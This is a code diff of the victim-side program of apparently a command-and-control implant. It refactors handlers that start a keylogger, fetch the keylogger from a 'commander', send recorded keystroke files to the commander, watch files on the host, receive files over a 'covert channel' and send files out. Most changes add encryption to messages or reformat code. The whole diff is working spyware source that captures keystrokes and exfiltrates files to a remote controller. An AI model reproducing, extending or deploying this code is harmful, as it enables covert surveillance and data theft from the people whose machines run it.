@@ -37,7 +37,7 @@ if __name__ == '__main__':
                     print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                     break
 
-# a) Command to start/stop keylogger program
+                # a) Command to start/stop keylogger program
                 if decrypted_data == constants.START_KEYLOG_MSG:
                     print(constants.START_KEYLOGGER_PROMPT)
                     client_socket.send(encrypt_string(constants.RECEIVED_CONFIRMATION_MSG, shared_secret).encode())
@@ -69,8 +69,9 @@ if __name__ == '__main__':
                             # Start Keylogger
                             if signal_start == constants.START_KEYLOG_MSG:
                                 print(constants.EXECUTE_KEYLOG_MSG.format(file_name))
-                                client_socket.send(encrypt_string(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name),
-                                                                  shared_secret).encode())
+                                client_socket.send(
+                                    encrypt_string(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name),
+                                                   shared_secret).encode())
                                 module_name = file_name[:(len(file_name)) - 3]
 
                                 # Set global signal and start a thread to watch (prevents recv() blocking)
@@ -105,7 +106,7 @@ if __name__ == '__main__':
                             msg = client_socket.send(encrypt_string(constants.FILE_NOT_FOUND_TO_CMDR_ERROR
                                                                     .format(file_name), shared_secret).encode())
 
-# b) Command to GET keylog program from commander
+                # b) Command to GET keylog program from commander
                 if decrypted_data == constants.GET_KEYLOGGER_MSG:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))
 
@@ -141,7 +142,7 @@ if __name__ == '__main__':
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
-# c) Check if data is to send recorded keystroked file(s) to commander
+                # c) Check if data is to send recorded keystroked file(s) to commander
                 if decrypted_data == constants.TRANSFER_KEYLOG_FILE_MSG:
                     print(constants.CLIENT_RESPONSE.format(decrypted_data))
                     print(constants.GET_KEYLOG_REQUEST_MSG)
@@ -185,42 +186,41 @@ if __name__ == '__main__':
                         print(constants.SEARCH_FILES_ERROR_MSG)
                         client_socket.send(encrypt_string(constants.SEARCH_FILES_ERROR_SEND, shared_secret).encode())
 
-# d) WATCH FILE
-                if data.decode() == constants.WATCH_FILE_SIGNAL:
+                # d) WATCH FILE
+                if decrypted_data == constants.WATCH_FILE_SIGNAL:
                     print("[+] Client says: {}".format(constants.WATCH_FILE_SIGNAL))
 
                     # Get file name from client
-                    file_path = client_socket.recv(1024).decode()
+                    file_path = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
                     print("[+] Client has requested to watch the following file (path): {}".format(file_path))
 
                     # Check if file exists (in a given path) + Apply logic
                     if os.path.exists(file_path):
                         print(constants.WATCH_FILE_EXISTS_MSG.format(file_path))
-                        client_socket.send((constants.STATUS_TRUE + "/" +
-                                            constants.WATCH_FILE_EXISTS_MSG_TO_CMDR.format(file_path)).encode())
+                        client_socket.send(encrypt_string(constants.STATUS_TRUE, shared_secret).encode())
 
                         # Open a separate thread to monitor commander socket (prevent recv() from program hanging)
                         signal_queue = queue.Queue()
                         watch_stop_thread = threading.Thread(target=watch_stop_signal,
                                                              args=(client_socket,
-                                                                   signal_queue),
+                                                                   signal_queue,
+                                                                   shared_secret),
                                                              name="Watch_Stop_Signal")
                         watch_stop_thread.daemon = True
                         watch_stop_thread.start()
                         print(constants.THREAD_START_MSG.format(watch_stop_thread.name))
 
                         # Send to the commander whenever the file has an event
-                        watch_file(client_socket, file_path, signal_queue)
+                        watch_file(client_socket, file_path, signal_queue, shared_secret)
 
                         # Close Watch Stop Thread
                         watch_stop_thread.join()
                         print(constants.WATCH_FILE_STOPPED)
                     else:
                         print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
-                        client_socket.send((constants.STATUS_FALSE + "/" +
-                                            constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
+                        client_socket.send(encrypt_string(constants.STATUS_FALSE, shared_secret).encode())
 
-# e) Receive File from Commander (Covert Channel)
+                # e) Receive File from Commander (Covert Channel)
                 if decrypted_data == constants.TRANSFER_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
@@ -241,7 +241,7 @@ if __name__ == '__main__':
                     receive_file_covert(client_socket, client_address[0], client_address[1],
                                         source_ip, source_port, shared_secret, choices, filename)
 
-# f) Transfer file to Commander
+                # f) Transfer file to Commander
                 if decrypted_data == constants.GET_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_FILE_SIGNAL))
 
